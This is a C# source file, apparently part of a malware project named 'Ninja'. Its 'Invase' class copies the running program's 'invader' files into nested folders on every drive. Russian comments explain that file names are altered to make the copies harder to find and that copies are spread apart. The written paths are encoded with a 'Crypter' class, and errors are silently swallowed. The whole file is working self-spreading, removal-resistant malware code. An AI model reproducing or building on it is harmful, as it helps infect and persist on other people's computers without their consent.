using System;
using System.IO;



namespace Ninja
{
    class Invase
    {
         private static bool ContainInArr(string[] arr, string path)
        {
            bool rezult = false;
            foreach (string s in arr)
                if (s == path)
                {
                    rezult = true;
                    break;
                }
            return rezult;
        }

        private static string RealAppPath(string fileName)//возвращает реальное место расположение ТЕКУЩЕЙ исполняемой сборки приложения
        {
            string path = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
            path += @"\" + fileName;
            return path;
        }


        public static void InsertCopyes(string[] allDrives,string[] allInvaderNames, ref string[] lastAdress)
        {
            int numOfSucces = 0;
            string endPath = "";

            //с увеличением числа копий, увеличивается время обхода.Возможно, нужно юзать  таски
            //если юзать такси, то покрытие будет страдать - трудно будет заставить копии разбегаться как можно дальше друг от друга
            for (int t = 0; t < allInvaderNames.Length; t++)
            {
//Console.WriteLine($"invader №={t }");
                for (int g = 0; g < allDrives.Length; g++)//поиск по дискам типа D:\
                {
//Console.WriteLine($"   disk ={allDrives[g] }");
                    string[] searchdirectory = Directory.GetDirectories(allDrives[g]);
                    string[] subPacks;
                    if (searchdirectory.Length > 0)
                    {
                        for (int i = 0; i < searchdirectory.Length; i++)//поиск по  поддиректориям типа D:\programm
                        {
//Console.WriteLine($"       path ={searchdirectory[i] }");
                            try
                            {
                                subPacks = Directory.GetDirectories(searchdirectory[i]);//поиск по вложенным дирректориям типа D:\programm\prog
                                for (int f = 0; f < subPacks.Length; f++)
                                {
//Console.WriteLine($"           subpath ={subPacks[f] }");
                                    try
                                    {
                                        endPath = string.Concat(subPacks[f], @"\",i.ToString() ,allInvaderNames[numOfSucces]);//имена файлов слегка меняем, чтобы искать было труднее
                                        if (ContainInArr(lastAdress, endPath) == false)//чтоб не складывать все яйца в одну корзину
                                        {

                                            string startPath = RealAppPath(allInvaderNames[numOfSucces]);
                                            File.Copy(startPath, endPath);//копирование происходит в ту папку, которая были созданы НЕ на этом ПК, а потом скопированы сюда
                                            lastAdress[numOfSucces] = Crypter.Encode(endPath,true);//записываем путь, куда смогли скопироваться
                                            numOfSucces += 1;
                                            f = subPacks.Length;
                                            //следующий будет искать в другой дирректории по списку

                                            //i = searchdirectory.Length;//остальные можно копировать на этот же диск

//Console.WriteLine($"      succes! ={subPacks[i]} ");
                                        }
                                    }
                                    catch (Exception exp) { }
                                }
                            }
                            catch (Exception e) { }
                        }
                    }
                }
            }


        }
    }
}
